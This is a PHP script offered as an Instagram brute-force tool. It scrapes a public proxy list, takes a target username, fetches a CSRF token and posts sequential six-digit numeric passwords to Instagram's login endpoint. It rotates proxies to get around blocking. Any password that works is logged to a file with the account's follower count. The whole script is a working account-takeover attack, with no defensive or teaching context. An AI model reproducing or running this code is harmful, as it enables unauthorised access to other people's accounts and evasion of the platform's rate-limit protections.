<?php
//"authorName":"yuss"
//"contactAuthor":"yus17726@gmail.com"
//"facebookAuthor":"http://facebook.com/yus.127.0.0.1"

error_reporting(0);
ini_set('display_errors',0);

$urlprox = file_get_contents("https://free-proxy-list.net/");
preg_match_all("'<tr>(.*?)</tr>'si", $urlprox, $prox);

exec("rm -rf listip.txt");
for ($i=1; $i <= 300; $i++) { 
    $exp = explode("<td>", $prox[0][$i]);
    $ip = explode("</td>", $exp[1]);
    $port = explode("</td>", $exp[2]);
    $ip = $ip[0];
    $port = $port[0];
    $listip = fopen("listip.txt", "a+");
    fwrite($listip, $ip . ":" . $port . "\n");
    fclose($listip);
}

$open = fopen("listip.txt", "r");
$size = filesize("listip.txt");
$read = fread($open, $size);
$lists = explode("\n", $read);

/*print "

             /\
            ( ;`~v/~~~ ;._
         ,/'\"/^) ' < o\  '\".~'\\\--,
       ,/\",/W  u '`. ~  >,._..,   )'
      ,/'  w  ,U^v  ;//^)/')/^\;~)'
   ,/\"'/   W` ^v  W |;         )/'
 ;''  |  v' v`\" W }  \\
\"    .'\    v  `v/^W,) '\)\.)\/)
                   `\   ,/,)'   ''')/^\"-;'
                        \
                         '\". _";*/

print '
 _____ _   _  _____ _______       _____ _____            __  __ 
|_   _| \ | |/ ____|__   __|/\   / ____|  __ \     /\   |  \/  |
  | | |  \| | (___    | |  /  \ | |  __| |__) |   /  \  | \  / |
  | | | . ` |\___ \   | | / /\ \| | |_ |  _  /   / /\ \ | |\/| |
 _| |_| |\  |____) |  | |/ ____ \ |__| | | \ \  / ____ \| |  | |
|_____|_| \_|_____/   |_/_/    \_\_____|_|  \_\/_/    \_\_|  |_|
___.                 __          _____                           
\_ |_________ __ ___/  |_  _____/ ____\___________   ____  ____  
 | __ \_  __ \  |  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \ 
 | \_\ \  | \/  |  /|  | \  ___/|  | (  <_> )  | \/\  \__\  ___/ 
 |___  /__|  |____/ |__|  \___  >__|  \____/|__|    \___  >___  >
     \/                       \/                        \/    \/ 
[0] Account Instagram Brute Force with Number Looping;
[1] Created by Yuss;
[2] Just type email or username bitch
[3] It will checked automatically with number to login;
';

echo "\nType user target : ";
$user = trim(fgets(STDIN));
$l = 0;

function crotz($x, $y, $z)
{
    $file = file_get_contents("https://www.instagram.com/accounts/login/?source=auth_switcher");
    preg_match("|{\"config\":{\"csrf_token\":\"(.*?)\",\"viewer\":null,\"viewerId\":null}|", $file, $token);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, "".$z."");
    curl_setopt($ch, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: */*",
            "Accept-Language: en-US,en;q=0.5",
            "X-CSRFToken: ".$token,
            "X-Instagram-AJAX: 715dcf29ace5",
            "Content-Type: application/x-www-form-urlencoded",
            "X-Requested-With: XMLHttpRequest",
            "Cookie: rur=PRN; mcd=3; mid=XCdjEQAEAAG_q8yMgLoQn5ZcPlp8; csrftoken=".$token
    ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, "username=".$x."&password=".$y."&queryParams=%7B%22source%22%3A%22auth_switcher%22%7D");
    $exec = curl_exec($ch);
    $result = json_decode($exec);

    if($result->authenticated == "true")
    {
        $check = "https://www.instagram.com/".$x;
        $foll = curl_init($check);
        curl_setopt($foll, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($foll, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($foll);
        $code = curl_getinfo($foll, CURLINFO_HTTP_CODE);
        $exec= curl_exec($foll);
        curl_close($foll);
        if($code == 200)
        {
            $flow = file_get_contents("https://www.instagram.com/".$x);
            preg_match("|\"edge_followed_by\":{\"count\":(.*?)},\"followed_by_viewer\"|", $flow, $followers);
            $end = fopen("ig_result.txt", "a+");
            fwrite($end, "Live account InstaGram -> email/username : ".$x." password : ".$y." have ".$followers[1]." followers\n");
            print "\n[".date('H:m:s')."] Live account InstaGram with user : ".$x." password : ".$y." have ".$followers[1]." followers with password ".$y."\n\n";
            fclose($end);
        } else {
            $end = fopen("ig_result.txt", "a+");
            fwrite($end, "Live account InstaGram -> email/username : ".$x." password : ".$y." but can't see followers\n");
            print "\n[".date('H:m:s')."] Live account InstaGram with user : ".$x." password : ".$y." but can't see followers\n\n";
            fclose($end);
        }
        $return = "success";
    } else if($result->user == "true")
    {
            print "[".date('H:m:s')."] ".$y." as password is not matching for user ".$x."\n";
            $return = "failed";
    } else if($result->user == "false")
    {
            print "[".date('H:m:s')."] account with ".$x." as username is not registered\n";
            $return = "unregist";
    }  else {
    		print("This proxy ".$z." is blocked or your connection is reset\n");
    		$return = "block";
    }

    return $return;
}

for($i = 0; $i <= 9999999999999; $i++)
{
	if($lists[$l] != ":"){
		print "trying with proxy => ".$lists[$l]."\n";
		$return = crotz($user, sprintf('%06d', $i), $lists[$l]);

		if($return == "block"){
			while ($l <= count($lists)) {
				if($l < count($lists)){
					$l = $l+1;
				} else {
					$l = 0;
				}

				print "trying with proxy => ".$lists[$l]."\n";
				$return = crotz($user, sprintf('%06d', $i), $lists[$l]);

				if($return == "success" || $return != "block"){
					break;
				}
			}
		} else if($return == "success"){
			print "bruted!!";
			break;
		}
	} else {
		print "You should check your internet!\n";
		break;
	}
}

?>
